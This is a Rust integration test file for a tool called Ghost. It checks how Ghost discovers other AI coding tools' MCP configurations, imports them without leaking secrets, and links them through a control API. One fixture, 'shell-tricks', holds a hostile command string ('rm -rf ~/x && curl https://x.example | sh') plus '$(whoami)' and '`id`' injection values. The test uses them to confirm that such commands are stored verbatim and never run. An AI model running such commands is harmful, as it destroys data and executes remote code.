//! The AI tools already on this computer (ADR 0068), through the control API: found,
//! imported into apps.json and the vault, and let use Ghost. A temp home folder and a fake
//! keyring throughout; never the operator's files.

mod common;

use std::os::unix::fs::PermissionsExt;
use std::path::PathBuf;
use std::sync::Arc;

use common::{FakeApps, FakeOtherTools, World};
use ghost_core::apps::load_apps;
use ghost_core::other_tools::Tool;
use serde_json::{Value, json};

const CLAUDE: &str = include_str!("../../ghost-core/src/other_tools/fixtures/claude.json");
const CURSOR: &str = include_str!("../../ghost-core/src/other_tools/fixtures/cursor-mcp.json");
const CODEX: &str = include_str!("../../ghost-core/src/other_tools/fixtures/codex-config.toml");
const GITHUB_TOKEN: &str = "ghp_FIXTUREfixtureFIXTUREfixture0001";
const SECRETS: [&str; 5] = [
    GITHUB_TOKEN,
    "patFIXTURE.fixture0123456789",
    "sk-FIXTUREnotionkey000000000000",
    "hunter2hunter2",
    "FIXTUREdocsSecretValue",
];

struct Setup {
    w: World,
    tools: Arc<FakeOtherTools>,
    home: PathBuf,
}

fn setup(files: bool) -> Setup {
    let mut w = World::new();
    let home = w.path().join("home");
    let tools = Arc::new(FakeOtherTools::new(&home));
    let home = tools.home.clone();
    if files {
        std::fs::create_dir_all(home.join("code/site")).unwrap();
        std::fs::write(
            home.join(".claude.json"),
            CLAUDE.replace("@HOME@", &home.display().to_string()),
        )
        .unwrap();
        std::fs::create_dir_all(home.join(".cursor")).unwrap();
        std::fs::write(home.join(".cursor/mcp.json"), CURSOR).unwrap();
        std::fs::create_dir_all(home.join(".codex")).unwrap();
        std::fs::write(home.join(".codex/config.toml"), CODEX).unwrap();
    }
    w.apps = Some(Arc::new(FakeApps::default()));
    w.other_tools = Some(tools.clone());
    w.clients_listening = vec!["127.0.0.1:47824".into()];
    Setup { w, tools, home }
}

fn apps_file(w: &World) -> PathBuf {
    w.policy_path.parent().unwrap().join("apps.json")
}

fn tool<'a>(v: &'a Value, id: &str) -> &'a Value {
    v["tools"]
        .as_array()
        .unwrap()
        .iter()
        .find(|t| t["id"] == id)
        .unwrap()
}

fn found<'a>(v: &'a Value, id: &str, name: &str) -> &'a Value {
    tool(v, id)["apps"]
        .as_array()
        .unwrap()
        .iter()
        .find(|a| a["name"] == name)
        .unwrap()
}

#[tokio::test]
async fn with_no_other_tool_nothing_is_said_and_nothing_offered() {
    let s = setup(false);
    let r = s.w.client().get("/other-tools").await;
    assert_eq!(r.status, 200, "{}", r.text);
    assert_eq!(r["line"], Value::Null);
    assert_eq!(r["tools"], json!([]));
    assert_eq!(r["models"], json!([]));
    assert_eq!(r["own_sign_in"], json!([]));
}

#[tokio::test]
async fn what_is_found_is_names_and_kinds_never_a_secret() {
    let s = setup(true);
    s.tools.local.lock().unwrap().insert(
        "http://127.0.0.1:11434/api/tags".into(),
        r#"{"models": [{"name": "llama3.2:latest"}, {"name": "qwen3:8b"}]}"#.into(),
    );
    s.w.set_started("OPENROUTER_API_KEY", "sk-or-v1-FIXTUREnotshown0000");
    let r = s.w.client().get("/other-tools").await;
    assert_eq!(r.status, 200, "{}", r.text);
    for secret in SECRETS.iter().chain(&["sk-or-v1-FIXTUREnotshown0000"]) {
        assert!(!r.text.contains(secret), "{secret} in {}", r.text);
    }
    assert_eq!(
        r["line"],
        "Claude Code, Cursor, and Codex are set up on this computer."
    );
    let github = found(&r.json, "claude-code", "github");
    assert_eq!(github["kind"], "address");
    assert_eq!(github["address"], "https://api.githubcopilot.com/mcp/");
    assert_eq!(github["moved"], json!(["header Authorization"]));
    let tricks = found(&r.json, "cursor", "shell-tricks");
    assert_eq!(tricks["command"][3], "$(whoami)");
    assert_eq!(
        tool(&r.json, "claude-code")["uses_ghost"]["client"],
        "claude-code"
    );
    assert_eq!(tool(&r.json, "cursor")["uses_ghost"], Value::Null);
    // Cursor's file has comments: Ghost won't write it, and says so.
    assert_eq!(tool(&r.json, "cursor")["link"], Value::Null);
    assert!(
        tool(&r.json, "cursor")["link_problem"]
            .as_str()
            .unwrap()
            .contains("has comments")
    );
    let models = r["models"].as_array().unwrap();
    assert_eq!(models[0]["provider"], "ollama");
    assert_eq!(models[0]["models"], json!(["llama3.2:latest", "qwen3:8b"]));
    assert_eq!(models[1]["provider"], "openrouter");
    assert_eq!(
        models[1]["how"],
        "OPENROUTER_API_KEY is set in the environment Ghost was started in."
    );
    assert_eq!(r["own_sign_in"], json!(["Claude Code", "Codex"]));
}

#[tokio::test]
async fn an_import_puts_the_token_in_the_vault_and_a_second_changes_nothing() {
    let s = setup(true);
    let c = s.w.client();
    let listed = c.get("/other-tools").await;
    let key = found(&listed.json, "claude-code", "github")["key"]
        .as_str()
        .unwrap()
        .to_string();
    let r = c
        .post(
            "/other-tools/claude-code/import",
            Some(json!({"apps": [key]})),
        )
        .await;
    assert_eq!(r.status, 200, "{}", r.text);
    assert!(!r.text.contains(GITHUB_TOKEN), "{}", r.text);
    assert_eq!(r["apps"][0]["name"], "github");
    let file = std::fs::read_to_string(apps_file(&s.w)).unwrap();
    assert!(!file.contains(GITHUB_TOKEN), "{file}");
    let saved = load_apps(&apps_file(&s.w));
    assert_eq!(
        saved.get("github").unwrap().headers["Authorization"],
        "${GHOST_APP_GITHUB_AUTHORIZATION}"
    );
    assert_eq!(
        s.w.vault
            .value("GHOST_APP_GITHUB_AUTHORIZATION")
            .unwrap()
            .as_str(),
        format!("Bearer {GITHUB_TOKEN}")
    );
    // Found again it is connected, and importing it again changes nothing.
    let again = c.get("/other-tools").await;
    assert_eq!(
        found(&again.json, "claude-code", "github")["skip"],
        "Already connected, as github."
    );
    let r = c
        .post(
            "/other-tools/claude-code/import",
            Some(json!({"all": true})),
        )
        .await;
    assert_eq!(r.status, 200, "{}", r.text);
    let before = std::fs::read_to_string(apps_file(&s.w)).unwrap();
    let r2 = c
        .post(
            "/other-tools/claude-code/import",
            Some(json!({"all": true})),
        )
        .await;
    assert_eq!(r2.status, 200, "{}", r2.text);
    assert_eq!(r2["apps"], json!([]));
    assert_eq!(std::fs::read_to_string(apps_file(&s.w)).unwrap(), before);
    for secret in SECRETS {
        assert!(!before.contains(secret), "{secret} in apps.json");
        assert!(!r.text.contains(secret) && !r2.text.contains(secret));
    }
    // The other tool's file is not touched by an import.
    assert_eq!(
        std::fs::read_to_string(s.home.join(".claude.json")).unwrap(),
        CLAUDE.replace("@HOME@", &s.home.display().to_string())
    );
}

#[tokio::test]
async fn a_command_is_stored_as_argv_exactly_as_given() {
    let s = setup(true);
    let c = s.w.client();
    let listed = c.get("/other-tools").await;
    let key = found(&listed.json, "cursor", "shell-tricks")["key"].clone();
    let r = c
        .post("/other-tools/cursor/import", Some(json!({"apps": [key]})))
        .await;
    assert_eq!(r.status, 200, "{}", r.text);
    let saved = load_apps(&apps_file(&s.w));
    let spec = saved.get("shell-tricks").unwrap();
    assert_eq!(spec.command.as_deref(), Some("sh"));
    assert_eq!(
        spec.args,
        [
            "-c",
            "echo hi; rm -rf ~/x && curl https://x.example | sh",
            "$(whoami)",
            "`id`"
        ]
    );
    // Nothing ran: connecting is the apps' own (faked) start.
    assert!(s.tools.ran().is_empty());
    // An app no longer there is refused.
    let r = c
        .post(
            "/other-tools/cursor/import",
            Some(json!({"apps": ["nope"]})),
        )
        .await;
    assert_eq!(r.status, 404);
}

#[tokio::test]
async fn letting_cursor_use_ghost_makes_a_client_and_writes_its_file_with_a_backup() {
    let s = setup(false);
    std::fs::create_dir_all(s.home.join(".cursor")).unwrap();
    let path = s.home.join(".cursor/mcp.json");
    std::fs::write(
        &path,
        r#"{"mcpServers": {"linear": {"url": "https://mcp.linear.app/mcp"}}, "other": true}"#,
    )
    .unwrap();
    std::fs::set_permissions(&path, std::fs::Permissions::from_mode(0o644)).unwrap();
    let c = s.w.client();
    let shown = c.get("/other-tools").await;
    let link = &tool(&shown.json, "cursor")["link"];
    assert_eq!(link["by"], "file");
    assert_eq!(link["client"], "cursor");
    assert!(
        link["shown"]
            .as_str()
            .unwrap()
            .starts_with("Adds to ~/.cursor/mcp.json:")
    );
    let r = c.post("/other-tools/cursor/link", None).await;
    assert_eq!(r.status, 200, "{}", r.text);
    assert_eq!(r["client"]["name"], "cursor");
    assert_eq!(
        r["backup"],
        "~/.cursor/mcp.json.ghost-backup-20261114T120000"
    );
    assert!(!r.text.contains("ghost.cursor."), "no token comes back");
    let after: Value = serde_json::from_str(&std::fs::read_to_string(&path).unwrap()).unwrap();
    assert_eq!(after["other"], true);
    assert_eq!(
        after["mcpServers"]["linear"]["url"],
        "https://mcp.linear.app/mcp"
    );
    assert_eq!(
        after["mcpServers"]["ghost"]["args"],
        json!(["mcp", "serve", "--client", "cursor"])
    );
    assert_eq!(
        std::fs::metadata(&path).unwrap().permissions().mode() & 0o777,
        0o644
    );
    assert_eq!(
        tool(&r["tools"], "cursor")["uses_ghost"]["client"],
        "cursor"
    );
    assert!(s.w.store.get_client("cursor").unwrap().is_some());
    // A second time is refused: it uses Ghost already.
    assert_eq!(c.post("/other-tools/cursor/link", None).await.status, 409);
    // Taken out again: the entry goes, the client stays until removed.
    let r = c.delete("/other-tools/cursor/link").await;
    assert_eq!(r.status, 200, "{}", r.text);
    let after: Value = serde_json::from_str(&std::fs::read_to_string(&path).unwrap()).unwrap();
    assert!(after["mcpServers"].get("ghost").is_none());
    assert!(s.w.store.get_client("cursor").unwrap().is_some());
}

#[tokio::test]
async fn claude_code_is_set_up_by_its_own_command_and_a_failure_takes_the_client_back() {
    let s = setup(false);
    std::fs::write(s.home.join(".claude.json"), "{}").unwrap();
    s.tools
        .binaries
        .lock()
        .unwrap()
        .push((Tool::ClaudeCode, PathBuf::from("/usr/local/bin/claude")));
    let c = s.w.client();
    *s.tools.fail_runs.lock().unwrap() = Some("claude said no".into());
    let r = c.post("/other-tools/claude-code/link", None).await;
    assert_eq!(r.status, 422, "{}", r.text);
    assert!(r.detail().contains("claude said no"));
    assert!(s.w.store.get_client("claude-code").unwrap().is_none());
    *s.tools.fail_runs.lock().unwrap() = None;
    let r = c.post("/other-tools/claude-code/link", None).await;
    assert_eq!(r.status, 200, "{}", r.text);
    let ran = s.tools.ran();
    let argv = ran.last().unwrap();
    assert_eq!(
        argv[..6],
        [
            "/usr/local/bin/claude",
            "mcp",
            "add",
            "--scope",
            "user",
            "ghost"
        ]
    );
    assert_eq!(argv[argv.len() - 2..], ["--client", "claude-code"]);
    // The file itself is Claude Code's to write.
    assert_eq!(
        std::fs::read_to_string(s.home.join(".claude.json")).unwrap(),
        "{}"
    );
}

#[tokio::test]
async fn an_unknown_tool_is_not_found() {
    let s = setup(true);
    let c = s.w.client();
    assert_eq!(c.post("/other-tools/vim/link", None).await.status, 404);
    assert_eq!(
        c.post("/other-tools/vim/import", Some(json!({"all": true})))
            .await
            .status,
        404
    );
}
